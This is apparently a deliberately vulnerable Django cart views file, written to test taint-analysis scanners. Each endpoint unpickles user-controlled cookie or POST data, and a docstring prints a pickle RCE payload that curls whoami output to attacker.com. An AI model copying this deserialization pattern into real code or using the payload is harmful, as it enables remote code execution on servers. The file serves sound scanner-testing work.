"""
Cart Views

Contains intentionally vulnerable endpoints for taint analysis demonstration.

Vulnerabilities:
- V10: Insecure Deserialization (pickle)
"""

import pickle
import base64
import json

from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse, HttpResponse
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.views.decorators.csrf import csrf_exempt

from .models import Cart, CartItem
from catalog.models import Product


def view_cart(request):
    """
    View shopping cart.

    ==========================================================================
    VULNERABILITY V10: Insecure Deserialization
    ==========================================================================
    CWE-502: Deserialization of Untrusted Data

    Taint Flow:
        Source: request.COOKIES['cart']
        Propagation: base64.b64decode()
        Sink: pickle.loads()

    Attack Vector:
        Generate malicious pickle payload that executes arbitrary code:

        import pickle, base64, os
        class Exploit:
            def __reduce__(self):
                return (os.system, ('curl http://attacker.com/$(whoami)',))
        payload = base64.b64encode(pickle.dumps(Exploit())).decode()

    This is one of the most dangerous vulnerabilities as it allows
    Remote Code Execution (RCE) on the server.

    Expected Detection:
        - Pysa: UserControlled -> Deserialization
        - CodeQL: py/unsafe-deserialization
        - Semgrep: python.lang.security.deserialization.avoid-pickle

    ==========================================================================
    """
    cart_data = {}

    # =================================================================
    # VULNERABLE CODE - Insecure Deserialization (V10)
    # =================================================================
    # SINK: Deserializing untrusted data from cookie using pickle

    cart_cookie = request.COOKIES.get('cart')

    if cart_cookie:
        try:
            # VULNERABLE: Decoding and deserializing user-controlled data
            decoded = base64.b64decode(cart_cookie)
            cart_data = pickle.loads(decoded)  # SINK - RCE possible here
        except Exception:
            # If deserialization fails, start with empty cart
            cart_data = {}

    # Convert cookie cart to products for display
    products = []
    total = 0

    for product_id, quantity in cart_data.items():
        try:
            product = Product.objects.get(id=product_id)
            subtotal = float(product.current_price) * quantity
            products.append({
                'product': product,
                'quantity': quantity,
                'subtotal': subtotal,
            })
            total += subtotal
        except Product.DoesNotExist:
            continue

    return render(request, 'cart/cart.html', {
        'cart_items': products,
        'total': total,
    })


@csrf_exempt
def add_to_cart(request, product_id):
    """
    Add product to cart.

    Uses vulnerable cookie-based cart storage with pickle serialization.
    """
    if request.method != 'POST':
        return JsonResponse({'error': 'POST required'}, status=405)

    product = get_object_or_404(Product, id=product_id)
    quantity = int(request.POST.get('quantity', 1))

    # Load existing cart from cookie
    cart_data = {}
    cart_cookie = request.COOKIES.get('cart')

    if cart_cookie:
        try:
            # VULNERABLE: Deserializing cart from cookie
            decoded = base64.b64decode(cart_cookie)
            cart_data = pickle.loads(decoded)  # SINK
        except Exception:
            cart_data = {}

    # Update cart
    if product_id in cart_data:
        cart_data[product_id] += quantity
    else:
        cart_data[product_id] = quantity

    # Save cart to cookie
    # VULNERABLE: Using pickle for serialization
    serialized = base64.b64encode(pickle.dumps(cart_data)).decode()

    response = JsonResponse({
        'success': True,
        'message': f'Added {quantity} x {product.name} to cart',
        'cart_count': sum(cart_data.values()),
    })
    response.set_cookie('cart', serialized, max_age=604800)  # 7 days

    return response


@csrf_exempt
def update_cart(request, product_id):
    """Update product quantity in cart."""
    if request.method != 'POST':
        return JsonResponse({'error': 'POST required'}, status=405)

    quantity = int(request.POST.get('quantity', 1))

    # Load cart from cookie
    cart_data = {}
    cart_cookie = request.COOKIES.get('cart')

    if cart_cookie:
        try:
            decoded = base64.b64decode(cart_cookie)
            cart_data = pickle.loads(decoded)  # SINK
        except Exception:
            cart_data = {}

    if quantity > 0:
        cart_data[product_id] = quantity
    else:
        cart_data.pop(product_id, None)

    # Save updated cart
    serialized = base64.b64encode(pickle.dumps(cart_data)).decode()

    response = JsonResponse({
        'success': True,
        'cart_count': sum(cart_data.values()),
    })
    response.set_cookie('cart', serialized, max_age=604800)

    return response


@csrf_exempt
def remove_from_cart(request, product_id):
    """Remove product from cart."""
    cart_data = {}
    cart_cookie = request.COOKIES.get('cart')

    if cart_cookie:
        try:
            decoded = base64.b64decode(cart_cookie)
            cart_data = pickle.loads(decoded)  # SINK
        except Exception:
            cart_data = {}

    cart_data.pop(product_id, None)

    serialized = base64.b64encode(pickle.dumps(cart_data)).decode()

    response = redirect('cart:view_cart')
    response.set_cookie('cart', serialized, max_age=604800)

    messages.success(request, 'Item removed from cart.')
    return response


def clear_cart(request):
    """Clear all items from cart."""
    response = redirect('cart:view_cart')
    response.delete_cookie('cart')
    messages.success(request, 'Cart cleared.')
    return response


@csrf_exempt
def import_cart(request):
    """
    Import cart from serialized data.

    VULNERABILITY V10 (variant): Alternative deserialization attack vector.
    Allows importing cart data from POST body.
    """
    if request.method != 'POST':
        return JsonResponse({'error': 'POST required'}, status=405)

    cart_data_raw = request.POST.get('cart_data', '')

    if not cart_data_raw:
        return JsonResponse({'error': 'No cart data provided'}, status=400)

    try:
        # =================================================================
        # VULNERABLE CODE - Insecure Deserialization (V10)
        # =================================================================
        # SINK: Deserializing arbitrary data from POST body

        decoded = base64.b64decode(cart_data_raw)
        cart_data = pickle.loads(decoded)  # SINK - RCE possible

        serialized = base64.b64encode(pickle.dumps(cart_data)).decode()

        response = JsonResponse({
            'success': True,
            'message': 'Cart imported successfully',
            'cart_count': sum(cart_data.values()) if isinstance(cart_data, dict) else 0,
        })
        response.set_cookie('cart', serialized, max_age=604800)

        return response

    except Exception as e:
        return JsonResponse({'error': str(e)}, status=400)


@csrf_exempt
def export_cart(request):
    """Export cart as serialized data."""
    cart_data = {}
    cart_cookie = request.COOKIES.get('cart')

    if cart_cookie:
        try:
            decoded = base64.b64decode(cart_cookie)
            cart_data = pickle.loads(decoded)  # SINK
        except Exception:
            cart_data = {}

    # Return serialized cart data
    serialized = base64.b64encode(pickle.dumps(cart_data)).decode()

    return JsonResponse({
        'cart_data': serialized,
        'items': cart_data,
    })


@login_required
def save_cart_to_db(request):
    """
    Save cookie-based cart to database for authenticated user.
    This is the safer storage mechanism (but still loads from vulnerable cookie).
    """
    cart_data = {}
    cart_cookie = request.COOKIES.get('cart')

    if cart_cookie:
        try:
            decoded = base64.b64decode(cart_cookie)
            cart_data = pickle.loads(decoded)  # SINK - still vulnerable here
        except Exception:
            cart_data = {}

    # Get or create user's cart
    cart, created = Cart.objects.get_or_create(
        user=request.user,
        is_active=True
    )

    # Clear existing items
    cart.items.all().delete()

    # Add items from cookie cart
    for product_id, quantity in cart_data.items():
        try:
            product = Product.objects.get(id=product_id)
            CartItem.objects.create(
                cart=cart,
                product=product,
                quantity=quantity
            )
        except Product.DoesNotExist:
            continue

    messages.success(request, 'Cart saved to your account.')

    # Clear cookie cart
    response = redirect('cart:view_cart')
    response.delete_cookie('cart')

    return response
